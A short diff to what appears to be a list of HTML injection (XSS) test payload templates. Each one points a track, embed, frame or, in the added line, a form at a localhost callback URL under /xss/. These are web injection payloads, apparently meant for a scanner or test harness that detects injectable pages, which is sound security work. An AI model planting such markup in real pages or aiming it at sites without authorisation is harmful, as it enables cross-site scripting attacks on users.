@@ -7,3 +7,4 @@
 <video controls><track src='http://127.0.0.1:8000/xss/{}/{}'></video>
 <embed src='http://127.0.0.1:8000/xss/{}/{}'>
 <frame src='http://127.0.0.1:8000/xss/{}/{}'>
+<form action="http://127.0.0.1:8000/xss/{}/{}" method="post"><input type="submit" id="a" value=click></form>
